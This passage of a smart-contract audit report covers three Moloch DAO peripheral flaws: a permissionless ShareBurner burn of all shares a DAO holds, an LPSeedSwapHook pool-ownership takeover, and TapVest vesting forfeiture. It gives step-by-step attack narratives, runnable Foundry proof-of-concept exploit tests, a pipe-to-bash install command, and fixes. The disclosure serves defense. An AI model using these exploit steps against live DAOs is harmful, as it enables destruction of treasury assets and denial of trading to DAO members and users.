   if (c.saleBurnDeadline > 0) { ... abi.encodeCall(IMoloch.setPermit, (... SHARE_BURNER ... burnData ... SHARE_BURNER ... uint256(1))) }
   ```

   Whenever saleBurnDeadline is nonzero, _buildCalls() appends a one-shot delegatecall permit for the SHARE_BURNER singleton. No validation ties this capability to a non-minting share sale or dedicated sale inventory.

4. **[src/Moloch.sol:244](../src/Moloch.sol#L244)**

   ```solidity
   (bool ok,) = initCalls[i].target.call{value: initCalls[i].value}(initCalls[i].data);
   ```

   During DAO initialization, Moloch executes the generated initCalls, which installs the ShareBurner permit on the new DAO.

5. **[src/peripheral/ShareBurner.sol:50](../src/peripheral/ShareBurner.sol#L50)**

   ```solidity
   function closeSale(address dao, address shares, uint256 deadline, bytes32 nonce) public { ... IMoloch(dao).spendPermit(... abi.encodeWithSelector(this.burnUnsold.selector, shares, deadline), nonce); }
   ```

   Any external caller can invoke ShareBurner.closeSale(); the ShareBurner contract itself is the permit holder/spender, so the attacker does not need governance privileges.

6. **[src/Moloch.sol:672](../src/Moloch.sol#L672)**

   ```solidity
   (ok, retData) = _execute(op, to, value, data);
   ```

   Moloch.spendPermit() burns the singleton’s one-shot receipt and delegatecalls into ShareBurner using the pre-authorized payload.

7. **[src/peripheral/ShareBurner.sol:43](../src/peripheral/ShareBurner.sol#L43)**

   ```solidity
   uint256 bal = IShares(shares).balanceOf(address(this));
   ```

   Inside the delegatecall, address(this) is the DAO, so burnUnsold() measures the DAO’s live shares balance rather than a tracked unsold-sale amount.

8. **[src/peripheral/ShareBurner.sol:44](../src/peripheral/ShareBurner.sol#L44)**

   ```solidity
   if (bal != 0) IShares(shares).burnFromMoloch(address(this), bal);
   ```

   SINK: the module burns the DAO’s entire current shares balance, permanently destroying unrelated treasury-held shares as well as any intended sale inventory.

#### Exploit Analysis

##### Attack Narrative
A public-chain attacker monitors DAOs deployed through `SafeSummoner` and inspects deployment calldata or wrapper configuration. When `saleBurnDeadline` is present, the attacker learns the fixed burn deadline, the deterministic DAO shares address, and the constant nonce `keccak256("ShareBurner")` that SafeSummoner uses when installing the permit.

Once the deadline passes, the attacker calls `ShareBurner.closeSale()` against the target DAO. That function is intentionally permissionless and uses the ShareBurner singleton itself as the permit holder, so the attacker does not need governance rights, token ownership, or an approval. The DAO then delegatecalls `burnUnsold()`, which burns the entire current DAO shares balance, regardless of whether those shares were sale inventory, LP-seeding inventory, reserves, or later transfers back into treasury.

##### Prerequisites
- **Attacker Control/Position:** Any EOA or contract able to submit a normal transaction
- **Required Access/Placement:** Unauthenticated / public-chain access
- **User Interaction:** None
- **Privileges/Configuration Required:** The DAO must have been deployed with `saleBurnDeadline > 0`, and the DAO must hold shares at its own address when the deadline is reached
- **Knowledge Required:** The attacker needs the DAO address, the configured deadline, and the deterministic shares address; these are obtainable from public deployment calldata and address derivation
- **Attack Complexity:** Low — no race, flash loan, or special sequencing beyond waiting until the deadline

##### Attack Steps
1. Identify a DAO deployed through `SafeSummoner` with `saleBurnDeadline > 0`.
2. Compute or read the DAO shares token address and the configured deadline.
3. Wait until `block.timestamp > deadline`.
4. Call `ShareBurner.closeSale(dao, sharesAddr, deadline, keccak256("ShareBurner"))`.
5. `ShareBurner` calls `dao.spendPermit(...)`, causing the DAO to delegatecall `burnUnsold(sharesAddr, deadline)`.
6. `burnUnsold()` reads `balanceOf(dao)` and burns that full amount via `burnFromMoloch()`.

##### Impact Breakdown
- **Confirmed Impact:** Any shares held by the DAO at burn time are permanently destroyed without governance approval.
- **Potential Follow-On Impact:** If those shares were being used as treasury inventory, LP-seeding inventory, or reserve governance supply, related workflows can fail and governance supply/quorum dynamics can shift unexpectedly.
- **Confidentiality:** None — the bug destroys or mutates assets; it does not expose secret data.
- **Integrity:** High — the attacker can irreversibly alter DAO-held token balances and total share supply.
- **Availability:** Low — operations that depend on those shares can fail or become unusable, but the entire protocol is not necessarily bricked.

#### Recommended Fix

Add explicit validation so SafeSummoner only auto-installs the ShareBurner helper for deployments that are actually using a non-minting **share** sale, and reject the helper for no-sale, minting-sale, loot-sale, or ambiguous module configurations.

**Before:**
```solidity
if (c.saleBurnDeadline > 0) {
    address sharesAddr = _predictShares(dao);
    bytes memory burnData =
        abi.encodeCall(IShareBurner.burnUnsold, (sharesAddr, c.saleBurnDeadline));
    calls[i++] = Call(
        dao,
        0,
        abi.encodeCall(
            IMoloch.setPermit,
            (
                uint8(1),
                SHARE_BURNER,
                uint256(0),
                burnData,
                keccak256("ShareBurner"),
                SHARE_BURNER,
                uint256(1)
            )
        )
    );
}
```

**After:**
```solidity
error InvalidShareBurnerConfig();

if (c.saleBurnDeadline > 0) {
    if (!c.saleActive || c.saleMinting || c.saleIsLoot) {
        revert InvalidShareBurnerConfig();
    }

    address sharesAddr = _predictShares(dao);
    bytes memory burnData =
        abi.encodeCall(IShareBurner.burnUnsold, (sharesAddr, c.saleBurnDeadline));
    calls[i++] = Call(
        dao,
        0,
        abi.encodeCall(
            IMoloch.setPermit,
            (
                uint8(1),
                SHARE_BURNER,
                uint256(0),
                burnData,
                keccak256("ShareBurner"),
                SHARE_BURNER,
                uint256(1)
            )
        )
    );
}
```

That validation removes the most dangerous misconfigurations, but the safer long-term fix is to redesign the burn path so it operates on a dedicated sale-inventory escrow or a tracked unsold amount instead of `balanceOf(dao)`. As long as `burnUnsold()` destroys the DAO’s live treasury balance, a stale one-shot permit can still burn unrelated shares that later arrive at the DAO address.

##### Security Principle
Capabilities should be granted according to least privilege and bound to the exact asset scope they are meant to affect. A helper intended for “unsold sale inventory” should not receive authority over the DAO’s entire present and future shares balance.

##### Defense in Depth
- Revoke or zero out the ShareBurner permit automatically when a sale finishes through another path, instead of leaving a latent one-shot burn right outstanding indefinitely.
- Move non-minting sale inventory into a dedicated escrow/module balance and burn only that escrow balance, never the DAO treasury’s general shares balance.
- Emit an explicit event when a ShareBurner permit is installed so off-chain monitors can flag risky deployments.

##### Verification Guidance
- Add regression tests asserting that `saleBurnDeadline > 0` reverts when `saleActive == false`, `saleMinting == true`, or `saleIsLoot == true`.
- Add a regression test proving that shares transferred back to the DAO after deployment are **not** burnable by a stale burn-helper configuration.
- If an escrow-based redesign is adopted, test that only unsold escrow inventory is burned and unrelated DAO-held shares remain untouched.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd $(git rev-parse --show-toplevel)
forge build
```

##### Runnable PoC
Save the following as `test/ShareBurnerNoSalePoC.t.sol` and run `forge test --match-test test_autoBurn_withoutSale -vv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Shares} from "../src/Moloch.sol";
import {SafeSummoner, Call, SHARE_BURNER} from "../src/peripheral/SafeSummoner.sol";
import {ShareBurner} from "../src/peripheral/ShareBurner.sol";

contract ShareBurnerNoSalePoC is Test {
    SafeSummoner internal safe;
    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("main");
        vm.deal(alice, 100 ether);
        safe = new SafeSummoner();
    }

    function test_autoBurn_withoutSale() public {
        bytes32 salt = bytes32(uint256(903));
        uint256 deadline = block.timestamp + 30 days;

        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100e18;

        address dao = safe.predictDAO(salt, holders, initShares);
        address sharesAddr = safe.predictShares(dao);

        SafeSummoner.SafeConfig memory cfg;
        cfg.proposalThreshold = 1e18;
        cfg.proposalTTL = 7 days;
        cfg.saleBurnDeadline = deadline;

        Call[] memory extra = new Call[](1);
        extra[0] = Call(
            sharesAddr,
            0,
            abi.encodeWithSignature("mintFromMoloch(address,uint256)", dao, 50e18)
        );

        safe.safeSummon("NoSale", "NS", "", 1000, true, address(0), salt, holders, initShares, cfg, extra);

        assertEq(Shares(sharesAddr).balanceOf(dao), 50e18);

        vm.warp(deadline + 1);
        vm.prank(attacker);
        ShareBurner(SHARE_BURNER).closeSale(dao, sharesAddr, deadline, keccak256("ShareBurner"));

        assertEq(Shares(sharesAddr).balanceOf(dao), 0);
    }
}
```

##### Steps
1. Save the PoC test file above.
- Expected: the repository still compiles successfully.
2. Run the targeted Foundry test.
```bash
forge test --match-test test_autoBurn_withoutSale -vv
```
- Expected: the test passes.

##### Verification
Confirm no sale is configured, the DAO still receives unrelated shares via an init call, and any external caller can burn that entire DAO-held balance after the burn deadline by invoking `ShareBurner.closeSale(...)`.

##### Outcome
Installing the auto-burn helper without an actual sale lets anyone destroy unrelated DAO-held shares after the deadline because `burnUnsold()` burns the DAO's full share balance instead of sale-scoped inventory.

</details>

---

<details>
<summary><strong>3. Singleton LP seed hook allows cross-DAO pool takeover and swap denial</strong></summary>

> **Review: Valid novel finding targeting LPSeedSwapHook peripheral. High severity accepted for peripheral scope.** The `poolDAO[poolId]` last-writer-wins mapping with no prior-owner check is a genuine architectural gap. The PoC demonstrates deterministic pool key collision and ownership takeover. Not a Moloch.sol core finding — targets `LPSeedSwapHook.sol`. This is the strongest contribution from the Winfunc audit: the shared pool namespace design was not identified by any prior audit. **V2 hardening:** namespace pool keys by DAO address (use `id0 = uint256(uint160(dao))`) or enforce immutable first-registration with `if (existing != address(0) && existing != dao) revert`.

**Winfunc ID:** `22`

**CVSS Score:** `8.2`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`

**Vulnerability Type:** `CWE-639: Authorization Bypass Through User-Controlled Key`

**Source Location:** `src/peripheral/LPSeedSwapHook.sol:181:configure()`

**Sink Location:** `src/peripheral/LPSeedSwapHook.sol:334:beforeAction()`

#### Summary

An attacker can seed a second DAO against an existing LPSeedSwapHook pool key, causing the hook to treat the attacker's DAO as the pool owner and leading to unauthorized swap-fee control or complete swap denial on the victim pool.

#### Root Cause

`configure()` stores arbitrary `tokenA`/`tokenB` pairs per DAO without binding them to a unique pool namespace, and `seed()` later builds `IZAMM.PoolKey({id0: 0, id1: 0, token0: t0, token1: t1, feeOrHook: hookFeeOrHook()})` before hashing it into `poolId`. Because `id0`/`id1` are hardcoded and `feeOrHook` is derived only from the singleton hook address, every DAO seeding the same pair gets the same `poolId`; `seed()` then blindly overwrites `poolDAO[poolId] = dao` with no prior-owner check. `beforeAction()` subsequently authorizes swaps and selects fees solely from `poolDAO[poolId]` and `seeds[dao]`, so the last DAO to seed that key becomes the effective controller for the existing pool.

#### Impact

###### Confirmed Impact
A second DAO can seize control over an already-seeded pool's hook configuration, set arbitrary swap fees through `setFee()`, or make all swaps revert by calling `cancel()` after taking over `poolDAO[poolId]`. The victim DAO cannot simply reseed to reclaim control because `seed()` is one-shot and leaves the victim config permanently marked as seeded.

###### Potential Follow-On Impact
Traders and routers interacting with the victim pool can be forced into failed swaps or attacker-chosen fee schedules, including effectively unusable fee levels such as `10_000` bps. Off-chain integrations that assume pool ownership is stable may continue routing to a pool whose authorization state has silently shifted, magnifying trading disruption until operators migrate liquidity or deploy a patched hook.

#### Source-to-Sink Trace

1. **[src/peripheral/LPSeedSwapHook.sol:195](../src/peripheral/LPSeedSwapHook.sol#L195)**

   ```solidity
   seeds[msg.sender] = SeedConfig({ tokenA: tokenA, tokenB: tokenB, amountA: amountA, amountB: amountB, ... });
   ```

   An attacker-controlled DAO can store an arbitrary token pair, including another DAO's share token, because configure() validates only nonzero amounts and token inequality.

2. **[src/peripheral/LPSeedSwapHook.sol:247](../src/peripheral/LPSeedSwapHook.sol#L247)**

   ```solidity
   IZAMM.PoolKey({id0: 0, id1: 0, token0: t0, token1: t1, feeOrHook: feeOrHook});
   ```

   seed() builds the pool key without any DAO-specific namespace. For the same canonicalized pair and the same singleton hook, every DAO derives the same key.

3. **[src/peripheral/LPSeedSwapHook.sol:250](../src/peripheral/LPSeedSwapHook.sol#L250)**

   ```solidity
   uint256 poolId = uint256(keccak256(abi.encode(key)));
   ```

   The shared key is hashed into a shared poolId, making collisions deterministic rather than accidental.

4. **[src/peripheral/LPSeedSwapHook.sol:251](../src/peripheral/LPSeedSwapHook.sol#L251)**

   ```solidity
   poolDAO[poolId] = dao;
   ```

   The attacker-controlled DAO address overwrites the existing pool-to-DAO binding with no check for prior registration or owner mismatch.

5. **[src/peripheral/LPSeedSwapHook.sol:334](../src/peripheral/LPSeedSwapHook.sol#L334)**

   ```solidity
   address dao = poolDAO[poolId];
   ```

   On every later hook callback, beforeAction() trusts the overwritten mapping as the authoritative owner for the pool.

6. **[src/peripheral/LPSeedSwapHook.sol:357](../src/peripheral/LPSeedSwapHook.sol#L357)**

   ```solidity
   uint16 fee = seeds[dao].feeBps; return fee == 0 ? DEFAULT_FEE_BPS : fee;
   ```

   Swap fee selection now follows the attacker DAO's config; if that DAO later calls cancel(), the earlier `!seeds[dao].seeded` check makes swaps revert instead.

#### Exploit Analysis

##### Attack Narrative
The attacker is an ordinary on-chain user who notices a DAO has already seeded a live LP through the singleton `LPSeedSwapHook`. Instead of attacking the victim DAO directly, the attacker creates a second DAO they control and configures its seed to use the exact same token pair and the same singleton hook address. Because `seed()` derives `poolId` only from the canonicalized pair plus the singleton hook, the attacker's later seed produces the same `poolId` and overwrites `poolDAO[poolId]`.

Once the overwrite lands, the hook no longer consults the victim DAO for swap readiness or fee policy. `beforeAction()` reads the attacker DAO from `poolDAO[poolId]`, returns whatever fee that DAO configured through `setFee()`, and reverts swaps if that DAO later calls `cancel()`. The victim DAO's own config remains marked as seeded, so it cannot simply reseed to restore control.

##### Prerequisites
- **Attacker Control/Position:** Control of any DAO the attacker can govern plus the assets required to seed the same pair
- **Required Access/Placement:** Unauthenticated public chain user
- **User Interaction:** None
- **Privileges/Configuration Required:** A victim pool seeded through `LPSeedSwapHook` must already exist. The attacker must be able to fund its DAO with the same pair assets; for ETH/shares pools this means obtaining some victim shares once they are transferable.
- **Knowledge Required:** The victim pool's token addresses and the public singleton hook address
- **Attack Complexity:** Low — the poolId formula is public, `configure()` accepts arbitrary token addresses, and `seed()` is permissionless once the attacker DAO is configured and funded

##### Attack Steps
1. Identify a seeded `LPSeedSwapHook` pool and recover its effective pair `(token0, token1)`.
2. Acquire enough of those same assets to seed a second pool entry; for ETH/shares pools, buy or otherwise obtain a small amount of the victim's share token.
3. Deploy or reuse an attacker-controlled DAO and call `setAllowance()` plus `configure()` so its `SeedConfig` uses the victim pair.
4. Call `seed(attackerDao)`. The hook derives the same `poolId` and overwrites `poolDAO[poolId]` with the attacker DAO.
5. Call `setFee()` from the attacker DAO to change swap fees for the victim pool, or call `cancel()` to make later swaps revert through `beforeAction()`.

##### Impact Breakdown
- **Confirmed Impact:** Unauthorized control of swap fee policy for an existing victim pool, plus complete denial of swap execution after `cancel()`.
- **Potential Follow-On Impact:** Traders and routers can be griefed into failed transactions or abusive fee schedules until operators migrate liquidity. Broader business impact depends on how much flow the affected pool handles.
- **Confidentiality:** None — the bug does not expose private data.
- **Integrity:** Low — the attacker can alter pool authorization/fee behavior without victim governance approval.
- **Availability:** High — the attacker can make all swaps on the affected pool revert by deleting its own seed config after takeover.

#### Recommended Fix

Bind each DAO's pool to a unique namespace in the `PoolKey`, and refuse to overwrite an existing `poolDAO` entry owned by another DAO. The current code hardcodes `id0 = 0` and `id1 = 0`, which makes pool identity depend only on the pair and the singleton hook address.

**Before**
```solidity
uint256 feeOrHook = hookFeeOrHook();
IZAMM.PoolKey memory key =
    IZAMM.PoolKey({id0: 0, id1: 0, token0: t0, token1: t1, feeOrHook: feeOrHook});

uint256 poolId = uint256(keccak256(abi.encode(key)));
poolDAO[poolId] = dao;
```

**After**
```solidity
error PoolAlreadyRegistered(address existingDao);

uint256 feeOrHook = hookFeeOrHook();
uint256 daoNamespace = uint256(uint160(dao));
IZAMM.PoolKey memory key = IZAMM.PoolKey({
    id0: daoNamespace,
    id1: 0,
    token0: t0,
    token1: t1,
    feeOrHook: feeOrHook
});

uint256 poolId = uint256(keccak256(abi.encode(key)));
address existing = poolDAO[poolId];
if (existing != address(0) && existing != dao) {
    revert PoolAlreadyRegistered(existing);
}
poolDAO[poolId] = dao;
```

If the product intentionally wants only one shared pool per pair, then the hook must not keep per-DAO mutable authorization state for that pool. In that design, fee ownership and readiness should be immutable pool properties established once, not a last-writer-wins mapping.

##### Security Principle
Authorization must be bound to a unique, unforgeable resource identifier. When multiple principals can legitimately create objects under a singleton contract, the identifier used for access control must include a principal-specific namespace or enforce immutable first registration.

##### Defense in Depth
- Add an explicit `daoPoolId[dao]` mapping and reject configuration changes that do not match the DAO's original registered pool.
- Emit a `PoolRegistered(poolId, dao)` event and monitor for attempted duplicate registrations in tests and off-chain ops tooling.
- Optionally assert that a pool with nonzero ZAMM liquidity cannot be rebound to a different DAO, even if some future refactor changes the `PoolKey` layout.

##### Verification Guidance
- Add a regression test where two different DAOs attempt to seed the same token pair and verify they either get distinct `poolId`s or the second seed reverts.
- Add a test confirming that `setFee()` and `cancel()` from DAO B do not alter `beforeAction()` results for DAO A's already-seeded pool.
- Add a positive-path test showing a single DAO can still seed, add liquidity, and swap normally with the namespaced key.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
export MAINNET_RPC_URL="https://<your-mainnet-rpc>"
forge test --fork-url "$MAINNET_RPC_URL" --match-test test_PoolCollisionHijack -vv
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch, Shares} from "../src/Moloch.sol";
import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
import {LPSeedSwapHook, IZAMM} from "../src/peripheral/LPSeedSwapHook.sol";

contract LPSeedPoolCollisionPoC is Test {
    address constant ZAMM_ADDR = 0x000000000000040470635EB91b7CE4D132D616eD;

    SafeSummoner safe;
    LPSeedSwapHook lpSeed;
    address alice = address(0xA11CE);

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        vm.deal(alice, 100 ether);
        safe = new SafeSummoner();
        lpSeed = new LPSeedSwapHook();
    }

    function _deployVictim(bytes32 salt) internal returns (address dao, address sharesAddr) {
        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100e18;

        dao = safe.predictDAO(salt, holders, initShares);
        sharesAddr = safe.predictShares(dao);

        Call[] memory extra = new Call[](4);
        extra[0] = Call(sharesAddr, 0, abi.encodeCall(Shares.mintFromMoloch, (dao, 10e18)));
        extra[1] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(lpSeed), address(0), 1 ether))
        );
        extra[2] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(lpSeed), sharesAddr, 10e18))
        );
        extra[3] = Call(
            address(lpSeed),
            0,
            abi.encodeCall(
                lpSeed.configure,
                (address(0), uint128(1 ether), sharesAddr, uint128(10e18), uint40(0), address(0), uint128(0))
            )
        );

        SafeSummoner.SafeConfig memory c;
        c.proposalThreshold = 1e18;
        c.proposalTTL = 7 days;

        safe.safeSummon("VictimDAO", "VIC", "", 1000, true, address(0), salt, holders, initShares, c, extra);
        vm.deal(dao, 2 ether);
    }

    function _deployAttackerDAO(bytes32 salt) internal returns (address dao) {
        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100e18;

        dao = safe.predictDAO(salt, holders, initShares);

        SafeSummoner.SafeConfig memory c;
        c.proposalThreshold = 1e18;
        c.proposalTTL = 7 days;

        safe.safeSummon("AttackerDAO", "ATK", "", 1000, true, address(0), salt, holders, initShares, c, new Call[](0));
        vm.deal(dao, 2 ether);
    }

    function _poolId(address tokenA, address tokenB) internal view returns (uint256) {
        (address t0, address t1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        IZAMM.PoolKey memory key = IZAMM.PoolKey({
            id0: 0,
            id1: 0,
            token0: t0,
            token1: t1,
            feeOrHook: lpSeed.hookFeeOrHook()
        });
        return uint256(keccak256(abi.encode(key)));
    }

    function test_PoolCollisionHijack() public {
        (address victimDao, address victimShares) = _deployVictim(bytes32(uint256(1)));
        lpSeed.seed(victimDao);

        uint256 poolId = _poolId(address(0), victimShares);
        assertEq(lpSeed.poolDAO(poolId), victimDao, "victim should control pool initially");

        vm.prank(ZAMM_ADDR);
        assertEq(lpSeed.beforeAction(IZAMM.swapExactIn.selector, poolId, address(this), ""), 30);

        address attackerDao = _deployAttackerDAO(bytes32(uint256(2)));

        // Acquire a small amount of the victim's share token and fund the attacker's DAO treasury.
        vm.prank(alice);
        Shares(victimShares).transfer(attackerDao, 1e18);

        vm.prank(attackerDao);
        Moloch(payable(attackerDao)).setAllowance(address(lpSeed), address(0), 1 ether);
        vm.prank(attackerDao);
        Moloch(payable(attackerDao)).setAllowance(address(lpSeed), victimShares, 1e18);
        vm.prank(attackerDao);
        lpSeed.configure(address(0), uint128(1 ether), victimShares, uint128(1e18), 0, address(0), 0);

        // This overwrites poolDAO[poolId] even though the victim pool already exists.
        lpSeed.seed(attackerDao);
        assertEq(lpSeed.poolDAO(poolId), attackerDao, "attacker DAO has seized hook ownership");

        vm.prank(attackerDao);
        lpSeed.setFee(1234);

        vm.prank(ZAMM_ADDR);
        assertEq(lpSeed.beforeAction(IZAMM.swapExactIn.selector, poolId, address(this), ""), 1234);

        vm.prank(attackerDao);
        lpSeed.cancel();

        vm.prank(ZAMM_ADDR);
        vm.expectRevert(LPSeedSwapHook.NotReady.selector);
        lpSeed.beforeAction(IZAMM.swapExactIn.selector, poolId, address(this), "");
    }
}
```

##### Steps
1. **Save the PoC test** as `test/LPSeedPoolCollisionPoC.t.sol`.
- Expected: the repository now contains a dedicated regression test for the pool collision bug.
2. **Set a mainnet RPC URL**.
```bash
export MAINNET_RPC_URL="https://<your-mainnet-rpc>"
```
- Expected: Foundry can fork mainnet, matching the repository's existing LP seed tests.
3. **Run the test**.
```bash
forge test --fork-url "$MAINNET_RPC_URL" --match-test test_PoolCollisionHijack -vv
```
- Expected: the test passes and shows that `poolDAO[poolId]` flips from the victim DAO to the attacker DAO.

##### Verification
Confirm the following assertions succeed:
- `poolDAO(poolId)` is initially the victim DAO after the first seed.
- After the attacker seeds the same pair, `poolDAO(poolId)` equals the attacker DAO.
- `beforeAction()` returns the attacker-selected fee (`1234`) for the victim pool's `poolId`.
- After `attackerDao.cancel()`, `beforeAction()` reverts with `NotReady`, proving swap DoS.

##### Outcome
The attacker gains effective control over the victim pool's hook-managed policy surface. Without touching the victim DAO's governance, the attacker can change the fee schedule used by swaps on that pool or make all swaps revert until liquidity is migrated to a new, non-colliding pool design.

</details>

---

<details>
<summary><strong>4. Permissionless tap claims can permanently erase accrued vesting during treasury shortfalls</strong></summary>

> **Review: Duplicate of Certora FV L-01 / webrainsec H-01 (tap forfeiture class). Severity adjusted to Low (acknowledged by-design behavior).** The tap forfeiture root cause — `lastClaim` advances unconditionally on partial claims — was first identified by Certora FV (L-01) and independently confirmed by webrainsec (H-01) and Grimoire. The project team acknowledged this as intentional Moloch exit-rights design: ragequit is sacrosanct and can drain treasury below tap obligations. The permissionless `claim()` angle adds a sharper framing (third-party griefing during shortfalls), but the root cause is documented and accepted. Not a Moloch.sol core finding — targets `TapVest.sol` peripheral. **Severity: Low (acknowledged design tradeoff, previously documented).**

**Winfunc ID:** `11`

**CVSS Score:** `8.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`

**Vulnerability Type:** `CWE-841: Improper Enforcement of Behavioral Workflow`

**Source Location:** `src/peripheral/TapVest.sol:59:claim()`

**Sink Location:** `src/peripheral/TapVest.sol:83:claim()`

#### Summary

An unprivileged network attacker can trigger a partial tap payout in TapVest during temporary underfunding, leading to permanent loss of the beneficiary’s already-accrued vesting.

#### Root Cause

`src/peripheral/TapVest.sol::claim()` computes `owed` from elapsed time since `lastClaim`, but then caps the actual payout by the DAO's current allowance and current treasury balance. Even when `claimed < owed`, the function unconditionally writes `tap.lastClaim = block.timestamp` and `TapConfig` has no carry/debt field, so the unpaid remainder is discarded instead of preserved for a later claim.

The impact is amplified because `claim()` is deliberately permissionless: any EOA or contract can force this state transition without being the beneficiary or the DAO.

#### Impact

###### Confirmed Impact
A third party can permanently burn the portion of accrued tap payments that is not currently liquid or currently allowed at the moment of the call. After the DAO later refills the treasury or restores the allowance, the beneficiary can only claim fresh post-attack accrual; the previously accrued shortfall is gone.

###### Potential Follow-On Impact
This can disrupt payroll or ops funding, force manual reimbursement by governance, and create targeted mempool griefing opportunities around visible treasury refill or allowance-increase transactions. In DAOs that rely on taps for continuous contributor compensation, repeated griefing during shortfall windows can cause sustained operational harm even though the attacker does not directly steal funds.

#### Source-to-Sink Trace

1. **[src/peripheral/TapVest.sol:59](../src/peripheral/TapVest.sol#L59)**

   ```solidity
   function claim(address dao) public returns (uint256 claimed) {
   ```

   The vulnerable path starts at a public, permissionless entrypoint. Any EOA or contract can call this function for any configured DAO.

2. **[src/peripheral/TapVest.sol:68](../src/peripheral/TapVest.sol#L68)**

   ```solidity
   uint256 owed = uint256(tap.ratePerSec) * uint256(elapsed);
   ```

   The contract computes the total accrued entitlement from elapsed time since the previous claim baseline.

3. **[src/peripheral/TapVest.sol:78](../src/peripheral/TapVest.sol#L78)**

   ```solidity
   claimed = owed < allowance ? owed : allowance; if (claimed > daoBalance) claimed = daoBalance;
   ```

   The actual payout is reduced to the DAO's current allowance and current treasury balance, so partial funding (`claimed < owed`) is explicitly possible.

4. **[src/peripheral/TapVest.sol:83](../src/peripheral/TapVest.sol#L83)**

   ```solidity
   tap.lastClaim = uint64(block.timestamp);
   ```

   SINK: the contract irreversibly advances the accrual baseline to the current timestamp even when only a partial payout was possible.

5. **[src/peripheral/TapVest.sol:123](../src/peripheral/TapVest.sol#L123)**

   ```solidity
   uint64 elapsed = uint64(block.timestamp) - tap.lastClaim; return uint256(tap.ratePerSec) * uint256(elapsed);
   ```

   Subsequent `pending()` calculations use the new `lastClaim` and have no separate backlog field, so the unpaid shortfall can no longer be recovered.

#### Exploit Analysis

##### Attack Narrative
The attacker is any public-chain participant watching a DAO that uses `TapVest` for continuous payouts. They monitor the tap's public `claimable`, `pending`, current allowance, and treasury balance, and wait for a moment where the accrued amount exceeds the DAO's current liquid balance or the currently configured allowance.

At that point, the attacker sends a single `claim(dao)` transaction. `TapVest` pays only the currently fundable portion, but it still advances `lastClaim` to the current timestamp. Once that happens, the remaining accrued backlog no longer exists in contract state. If the DAO later refills the treasury or restores the allowance, the beneficiary can only collect new accrual from the new timestamp forward.

##### Prerequisites
- **Attacker Control/Position:** Any EOA or contract able to submit a transaction to the public chain
- **Required Access/Placement:** Unauthenticated / public on-chain access
- **User Interaction:** None
- **Privileges/Configuration Required:** The target DAO must have an active `TapVest` configuration, and the call must occur while the DAO is temporarily underfunded or the tap allowance is temporarily lower than accrued debt
- **Knowledge Required:** DAO address and public on-chain knowledge of tap/balance/allowance state; optionally awareness of pending treasury refill or allowance-increase transactions for frontrunning
- **Attack Complexity:** Low — the state needed to decide when to strike is public, and exploitation is a single transaction to a permissionless function

##### Attack Steps
1. Identify a DAO with a configured `TapVest` stream and observe that `pending(dao)` is materially larger than current `claimable(dao)`.
2. Wait until the DAO treasury balance or current allowance is lower than the accrued amount.
3. Call `TapVest.claim(dao)` from any EOA or contract before the beneficiary claims or before a treasury refill / allowance increase is mined.
4. Let the DAO replenish funds or allowance.
5. Observe that subsequent `pending(dao)` / `claimable(dao)` values start from the attack timestamp, not from the original unpaid accrual window.

##### Impact Breakdown
- **Confirmed Impact:** Permanent destruction of already-accrued tap payouts that were not immediately fundable at the moment of the attacker-triggered claim
- **Potential Follow-On Impact:** Payroll disruption, emergency manual reimbursement, contributor churn, and mempool griefing around announced treasury management actions; these downstream harms depend on DAO operations and social response
- **Confidentiality:** None — no secret data is exposed
- **Integrity:** High — an unauthorized caller can irreversibly alter vesting-accounting state and erase accrued payout rights
- **Availability:** Low — the beneficiary loses availability of previously earned funds and must rely on external compensation if governance wants to make them whole

#### Recommended Fix

Preserve unpaid accrual whenever a claim is only partially funded. The cleanest approach is to add a debt/carry field to `TapConfig`, roll it into `owed`, and store `owed - claimed` after each claim instead of discarding it.

Before:
```solidity
uint256 owed = uint256(tap.ratePerSec) * uint256(elapsed);
if (owed == 0) revert NothingToClaim();

uint256 allowance = IMoloch(dao).allowance(token, address(this));
uint256 daoBalance = token == address(0) ? dao.balance : balanceOf(token, dao);

claimed = owed < allowance ? owed : allowance;
if (claimed > daoBalance) claimed = daoBalance;
if (claimed == 0) revert NothingToClaim();

tap.lastClaim = uint64(block.timestamp);
IMoloch(dao).spendAllowance(token, claimed);
```

After:
```solidity
struct TapConfig {
    address token;
    address beneficiary;
    uint128 ratePerSec;
    uint64 lastClaim;
    uint256 unpaidAccrual;
}

uint256 owed = tap.unpaidAccrual + uint256(tap.ratePerSec) * uint256(elapsed);
if (owed == 0) revert NothingToClaim();

uint256 allowance = IMoloch(dao).allowance(token, address(this));
uint256 daoBalance = token == address(0) ? dao.balance : balanceOf(token, dao);

claimed = owed < allowance ? owed : allowance;
if (claimed > daoBalance) claimed = daoBalance;
if (claimed == 0) revert NothingToClaim();

tap.lastClaim = uint64(block.timestamp);
tap.unpaidAccrual = owed - claimed;

IMoloch(dao).spendAllowance(token, claimed);
```

If the intended DAICO behavior is that `setRate()` should remain non-retroactive, explicitly clear `unpaidAccrual` there; otherwise preserve it across rate changes according to the desired economics.

##### Security Principle
